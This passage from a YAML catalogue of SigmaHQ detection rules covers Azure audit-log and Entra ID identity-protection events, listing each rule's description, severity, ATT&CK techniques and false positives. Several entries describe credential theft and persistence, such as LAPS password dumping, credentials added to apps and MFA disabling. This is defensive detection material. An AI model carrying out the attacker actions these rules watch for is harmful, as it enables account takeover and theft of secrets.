  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-applications#appid-uri-added-modified-or-removed
  false_positives:
  - When and administrator is making legitimate AppID URI configuration changes to
    an application. This should be a planned event.
  notes: ''
- detection_id: cbb67ecc-fb70-4467-9350-c910bdf7c628
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_app_credential_added.yml
  name: Added Credentials to Existing Application
  description: Detects when a new credential is added to an existing application.
    Any additional credentials added outside of expected processes could be a malicious
    actor using those credentials.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098.001
  tags:
  - attack.privilege-escalation
  - attack.t1098.001
  - attack.persistence
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-applications#application-credentials
  false_positives:
  - When credentials are added/removed as part of the normal working hours/workflows
  notes: ''
- detection_id: a6355fbe-f36f-45d8-8efc-ab42465cbc52
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_app_delegated_permissions_all_users.yml
  name: Delegated Permissions Granted For All Users
  description: Detects when highly privileged delegated permissions are granted on
    behalf of all users
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1528
  tags:
  - attack.credential-access
  - attack.t1528
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-applications#application-granted-highly-privileged-permissions
  false_positives:
  - When the permission is legitimately needed for the app
  notes: ''
- detection_id: 9b2cc4c4-2ad4-416d-8e8e-ee6aa6f5035a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_app_end_user_consent.yml
  name: End User Consent
  description: Detects when an end user consents to an application
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1528
  tags:
  - attack.credential-access
  - attack.t1528
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-applications#end-user-consent
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7091372f-623c-4293-bc37-20c32b3492be
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_app_end_user_consent_blocked.yml
  name: End User Consent Blocked
  description: Detects when end user consent is blocked due to risk-based consent.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1528
  tags:
  - attack.credential-access
  - attack.t1528
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-applications#end-user-stopped-due-to-risk-based-consent
  false_positives:
  - Unknown
  notes: ''
- detection_id: 74298991-9fc4-460e-a92e-511aa60baec1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_app_owner_added.yml
  name: Added Owner To Application
  description: Detects when a new owner is added to an application. This gives that
    account privileges to make modifications and configuration changes to the application.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1552
  tags:
  - attack.t1552
  - attack.credential-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-applications#new-owner
  false_positives:
  - When a new application owner is added by an administrator
  notes: ''
- detection_id: c1d147ae-a951-48e5-8b41-dcd0170c7213
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_app_permissions_msft.yml
  name: App Granted Microsoft Permissions
  description: Detects when an application is granted delegated or app role permissions
    for Microsoft Graph, Exchange, Sharepoint, or Azure AD
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1528
  tags:
  - attack.credential-access
  - attack.t1528
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-applications#application-granted-highly-privileged-permissions
  false_positives:
  - When the permission is legitimately needed for the app
  notes: ''
- detection_id: 5aecf3d5-f8a0-48e7-99be-3a759df7358f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_app_privileged_permissions.yml
  name: App Granted Privileged Delegated Or App Permissions
  description: Detects when administrator grants either application permissions (app
    roles) or highly privileged delegated permissions
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1098.003
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-applications#application-granted-highly-privileged-permissions
  false_positives:
  - When the permission is legitimately needed for the app
  notes: ''
- detection_id: b04934b2-0a68-4845-8a19-bdfed3a68a7a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_app_role_added.yml
  name: App Assigned To Azure RBAC/Microsoft Entra Role
  description: Detects when an app is assigned Azure AD roles, such as global administrator,
    or Azure RBAC roles, such as subscription owner.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - risk_scoring_or_weighting
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1098.003
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-applications#service-principal-assigned-to-a-role
  false_positives:
  - When the permission is legitimately needed for the app
  notes: ''
- detection_id: 0055ad1f-be85-4798-83cf-a6da17c993b3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_app_uri_modifications.yml
  name: Application URI Configuration Changes
  description: 'Detects when a configuration change is made to an applications URI.

    URIs for domain names that no longer exist (dangling URIs), not using HTTPS, wildcards
    at the end of the domain, URIs that are no unique to that app, or URIs that point
    to domains you do not control should be investigated.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  - T1528
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1528
  - attack.t1078.004
  - attack.persistence
  - attack.credential-access
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-applications#application-configuration-changes
  false_positives:
  - When and administrator is making legitimate URI configuration changes to an application.
    This should be a planned event.
  notes: ''
- detection_id: a4b25073-8947-489c-a8dd-93b41c23f26d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_auditlogs_laps_credential_dumping.yml
  name: Windows LAPS Credential Dump From Entra ID
  description: Detects when an account dumps the LAPS password from Entra ID.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098.005
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098.005
  time_window: ''
  references:
  - https://twitter.com/NathanMcNulty/status/1785051227568632263
  - https://www.cloudcoffee.ch/microsoft-365/configure-windows-laps-in-microsoft-intune/
  - https://techcommunity.microsoft.com/t5/microsoft-entra-blog/introducing-windows-local-administrator-password-solution-with/ba-p/1942487
  false_positives:
  - Approved activity performed by an Administrator.
  notes: ''
- detection_id: 4d78a000-ab52-4564-88a5-7ab5242b20c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_change_to_authentication_method.yml
  name: Change to Authentication Method
  description: Change to authentication method could be an indicator of an attacker
    adding an auth method to the account so they can have continued access.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  - T1556
  tags:
  - attack.privilege-escalation
  - attack.credential-access
  - attack.t1556
  - attack.persistence
  - attack.defense-evasion
  - attack.t1098
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-accounts
  false_positives:
  - Unknown
  notes: ''
- detection_id: 352a54e1-74ba-4929-9d47-8193d67aba1e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_federation_modified.yml
  name: Azure Domain Federation Settings Modified
  description: Identifies when an user or application modified the federation settings
    on the domain.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-monitor-federation-changes
  false_positives:
  - Federation Settings being modified or deleted may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Federation Settings modified from unfamiliar users should be investigated. If
    known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 91c95675-1f27-46d0-bead-d1ae96b97cd3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_group_user_addition_ca_modification.yml
  name: User Added To Group With CA Policy Modification Access
  description: Monitor and alert on group membership additions of groups that have
    CA policy modification access
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1548
  - T1556
  tags:
  - attack.privilege-escalation
  - attack.credential-access
  - attack.defense-evasion
  - attack.persistence
  - attack.t1548
  - attack.t1556
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-infrastructure#conditional-access
  false_positives:
  - User removed from the group is approved
  notes: ''
- detection_id: 665e2d43-70dc-4ccc-9d27-026c9dd7ed9c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_group_user_removal_ca_modification.yml
  name: User Removed From Group With CA Policy Modification Access
  description: Monitor and alert on group membership removal of groups that have CA
    policy modification access
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1548
  - T1556
  tags:
  - attack.privilege-escalation
  - attack.credential-access
  - attack.defense-evasion
  - attack.persistence
  - attack.t1548
  - attack.t1556
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-infrastructure#conditional-access
  false_positives:
  - User removed from the group is approved
  notes: ''
- detection_id: 0b4b72e3-4c53-4d5b-b198-2c58cfef39a9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_guest_invite_failure.yml
  name: Guest User Invited By Non Approved Inviters
  description: Detects when a user that doesn't have permissions to invite a guest
    user attempts to invite one.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.initial-access
  - attack.persistence
  - attack.defense-evasion
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-accounts#things-to-monitor
  false_positives:
  - A non malicious user is unaware of the proper process
  notes: ''
- detection_id: 8dee7a0d-43fd-4b3c-8cd1-605e189d195e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_guest_to_member.yml
  name: User State Changed From Guest To Member
  description: Detects the change of user type from "Guest" to "Member" for potential
    elevation of privilege.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.initial-access
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-gb/entra/architecture/security-operations-user-accounts#monitoring-external-user-sign-ins
  false_positives:
  - If this was approved by System Administrator.
  notes: ''
- detection_id: 039a7469-0296-4450-84c0-f6966b16dc6d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_pim_activation_approve_deny.yml
  name: PIM Approvals And Deny Elevation
  description: Detects when a PIM elevation is approved or denied. Outside of normal
    operations should be investigated.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.persistence
  - attack.initial-access
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-identity-management#azure-ad-roles-assignment
  false_positives:
  - Actual admin using PIM.
  notes: ''
- detection_id: aeaef14c-e5bf-4690-a9c8-835caad458bd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_pim_alerts_disabled.yml
  name: PIM Alert Setting Changes To Disabled
  description: Detects when PIM alerts are set to disabled.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1078
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-identity-management#azure-ad-roles-assignment
  false_positives:
  - Administrator disabling PIM alerts as an active choice.
  notes: ''
- detection_id: db6c06c4-bf3b-421c-aa88-15672b88c743
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_pim_change_settings.yml
  name: Changes To PIM Settings
  description: Detects when changes are made to PIM roles
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-identity-management#azure-ad-roles-assignment
  false_positives:
  - Legit administrative PIM setting configuration changes
  notes: ''
- detection_id: 49a268a4-72f4-4e38-8a7b-885be690c5b5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_priviledged_role_assignment_add.yml
  name: User Added To Privilege Role
  description: Detects when a user is added to a privileged role.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.persistence
  - attack.initial-access
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-identity-management#azure-ad-roles-assignment
  false_positives:
  - Legtimate administrator actions of adding members from a role
  notes: ''
- detection_id: 102e11e3-2db5-4c9e-bc26-357d42585d21
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_priviledged_role_assignment_bulk_change.yml
  name: Bulk Deletion Changes To Privileged Account Permissions
  description: Detects when a user is removed from a privileged role. Bulk changes
    should be investigated.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-identity-management#azure-ad-roles-assignment
  false_positives:
  - Legtimate administrator actions of removing members from a role
  notes: ''
- detection_id: f7b5b004-dece-46e4-a4a5-f6fd0e1c6947
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_privileged_account_creation.yml
  name: Privileged Account Creation
  description: Detects when a new admin is created.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-accounts#changes-to-privileged-accounts
  false_positives:
  - A legitimate new admin account being created
  notes: ''
- detection_id: ca9bf243-465e-494a-9e54-bf9fc239057d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_subscription_permissions_elevation_via_auditlogs.yml
  name: Azure Subscription Permission Elevation Via AuditLogs
  description: 'Detects when a user has been elevated to manage all Azure Subscriptions.

    This change should be investigated immediately if it isn''t planned.

    This setting could allow an attacker access to Azure subscriptions in your environment.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-accounts#assignment-and-elevation
  false_positives:
  - If this was approved by System Administrator.
  notes: ''
- detection_id: fa84aaf5-8142-43cd-9ec2-78cfebf878ce
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_tap_added.yml
  name: Temporary Access Pass Added To An Account
  description: Detects when a temporary access pass (TAP) is added to an account.
    TAPs added to priv accounts should be investigated
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.initial-access
  - attack.defense-evasion
  - attack.persistence
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-accounts#changes-to-privileged-accounts
  false_positives:
  - Administrator adding a legitimate temporary access pass
  notes: ''
- detection_id: d4c7758e-9417-4f2e-9109-6125d66dabef
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_update_risk_and_mfa_registration_policy.yml
  name: User Risk and MFA Registration Policy Updated
  description: 'Detects changes and updates to the user risk and MFA registration
    policy.

    Attackers can modified the policies to Bypass MFA, weaken security thresholds,
    facilitate further attacks, maintain persistence.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/howto-identity-protection-configure-mfa-policy
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/reference-audit-activities
  false_positives:
  - Known updates by administrators.
  notes: ''
- detection_id: b18454c8-0be3-41f7-86bc-9c614611b839
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_user_account_mfa_disable.yml
  name: Multi Factor Authentication Disabled For User Account
  description: 'Detects changes to the "StrongAuthenticationRequirement" value, where
    the state is set to "0" or "Disabled".

    Threat actors were seen disabling multi factor authentication for users in order
    to maintain or achieve access to the account. Also see in SIM Swap attacks.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.credential-access
  - attack.persistence
  time_window: ''
  references:
  - https://www.sans.org/blog/defending-against-scattered-spider-and-the-com-with-cybercrime-intelligence/
  false_positives:
  - Legitimate authorized activity.
  notes: ''
- detection_id: 340ee172-4b67-4fb4-832f-f961bdc1f3aa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_user_password_change.yml
  name: Password Reset By User Account
  description: Detect when a user has reset their password in Azure AD
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.initial-access
  - attack.defense-evasion
  - attack.persistence
  - attack.credential-access
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-accounts
  false_positives:
  - If this was approved by System Administrator or confirmed user action.
  notes: ''
- detection_id: 6555754e-5e7f-4a67-ad1c-4041c413a007
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_anomalous_token.yml
  name: Anomalous Token
  description: Indicates that there are abnormal characteristics in the token such
    as an unusual token lifetime or a token that is played from an unfamiliar location.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1528
  tags:
  - attack.t1528
  - attack.credential-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#anomalous-token
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - We recommend investigating the sessions flagged by this detection in the context
    of other sign-ins from the user.
  notes: ''
- detection_id: 258b6593-215d-4a26-a141-c8e31c1299a6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_anomalous_user.yml
  name: Anomalous User Activity
  description: Indicates that there are anomalous patterns of behavior like suspicious
    changes to the directory.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.t1098
  - attack.persistence
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#anomalous-user-activity
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - We recommend investigating the sessions flagged by this detection in the context
    of other sign-ins from the user.
  notes: ''
- detection_id: be4d9c86-d702-4030-b52e-c7859110e5e8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_anonymous_ip_activity.yml
  name: Activity From Anonymous IP Address
  description: Identifies that users were active from an IP address that has been
    identified as an anonymous proxy IP address.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.t1078
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.initial-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#activity-from-anonymous-ip-address
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - We recommend investigating the sessions flagged by this detection in the context
    of other sign-ins from the user.
  notes: ''
- detection_id: 53acd925-2003-440d-a1f3-71a5253fe237
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_anonymous_ip_address.yml
  name: Anonymous IP Address
  description: Indicates sign-ins from an anonymous IP address, for example, using
    an anonymous browser or VPN.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1528
  tags:
  - attack.t1528
  - attack.credential-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/graph/api/resources/riskdetection?view=graph-rest-1.0
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#anonymous-ip-address
  false_positives:
  - We recommend investigating the sessions flagged by this detection in the context
    of other sign-ins
  notes: ''
- detection_id: 1a41023f-1e70-4026-921a-4d9341a9038e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_atypical_travel.yml
  name: Atypical Travel
  description: Identifies two sign-ins originating from geographically distant locations,
    where at least one of the locations may also be atypical for the user, given past
    behavior.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.t1078
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.initial-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#atypical-travel
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - We recommend investigating the sessions flagged by this detection in the context
    of other sign-ins from the user.
  notes: ''
- detection_id: b2572bf9-e20a-4594-b528-40bde666525a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_impossible_travel.yml
  name: Impossible Travel
  description: Identifies user activities originating from geographically distant
    locations within a time period shorter than the time it takes to travel from the
    first location to the second.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: riskdetection
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.t1078
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.initial-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#impossible-travel
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#unusual-sign-ins
  false_positives:
  - Connecting to a VPN, performing activity and then dropping and performing additional
    activity.
  notes: ''
- detection_id: 27e4f1d6-ae72-4ea0-8a67-77a73a289c3d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/identity_protection/azure_identity_protection_inbox_forwarding_rule.yml
  name: Suspicious Inbox Forwarding Identity Protection
